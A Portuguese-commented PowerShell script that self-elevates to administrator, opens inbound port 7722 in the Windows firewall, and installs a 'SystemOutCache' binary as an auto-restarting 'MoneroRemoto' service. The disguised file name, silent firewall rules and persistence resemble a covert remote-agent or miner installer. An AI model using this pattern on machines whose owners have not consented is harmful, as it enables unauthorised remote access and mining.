# Arquivo: install_service.ps1
# Script de Automação para Instalação do MoneroRemoto Service

# 1. Verifica Privilégios de Administrador
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Este script precisa ser executado como Administrador." -ForegroundColor Red
    Write-Host "Re-executando com privilégios elevados..." -ForegroundColor Yellow
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

Write-Host "=== INSTALADOR DO MONERO REMOTO SERVICE ===" -ForegroundColor Cyan

# 2. Configura Firewall (Porta 7722)
Write-Host "[+] Configurando Firewall (TCP 7722)..." -ForegroundColor Green
New-NetFirewallRule -DisplayName "MoneroRemoto Agent TCP" -Direction Inbound -LocalPort 7722 -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "MoneroRemoto Agent UDP" -Direction Inbound -LocalPort 7722 -Protocol UDP -Action Allow -ErrorAction SilentlyContinue

# 3. Identifica o Executável ou Script Python
$scriptPath = Join-Path $PSScriptRoot "SystemOutCache.py"
$exePath = Join-Path $PSScriptRoot "SystemOutCache.exe"

if (Test-Path $exePath) {
    Write-Host "[+] Executável encontrado: $exePath" -ForegroundColor Green
    $targetBinary = $exePath
}
elseif (Test-Path $scriptPath) {
    Write-Host "[+] Script Python encontrado: $scriptPath" -ForegroundColor Yellow
    Write-Host "    Nota: Instalando via Python Interpreter (não recomendado para produção final)"
    $pythonPath = (Get-Command python).Source
    if (-not $pythonPath) {
        Write-Error "Python não encontrado no PATH."
        exit
    }
    # Para scripts Python, o serviço é registrado de forma diferente (complexo via sc.exe, melhor usar o proprio script com params)
    $targetBinary = $pythonPath
}
else {
    Write-Error "Nenhum arquivo 'SystemOutCache.exe' ou 'SystemOutCache.py' encontrado."
    exit
}

# 4. Instalação do Serviço
Write-Host "[+] Instalando o Serviço..." -ForegroundColor Green

# Se for EXE (PyInstaller), ele já tem o handler embutido
if ($targetBinary -like "*.exe") {
    Start-Process -FilePath $targetBinary -ArgumentList "install" -Wait -NoNewWindow
    Start-Process -FilePath $targetBinary -ArgumentList "start" -Wait -NoNewWindow
} 
# Se for Python Script
else {
    python $scriptPath install
    python $scriptPath start
}

# 5. Configuração de Recuperação (Reiniciar se falhar)
Write-Host "[+] Configurando recuperação automática..." -ForegroundColor Green
sc.exe failure "MoneroRemotoService" reset= 0 actions= restart/5000/restart/5000/restart/5000

Write-Host "=== INSTALAÇÃO CONCLUÍDA ===" -ForegroundColor Cyan
Write-Host "Verifique o status executando: Get-Service MoneroRemotoService"
Start-Sleep -Seconds 3
Get-Service MoneroRemotoService
Pause
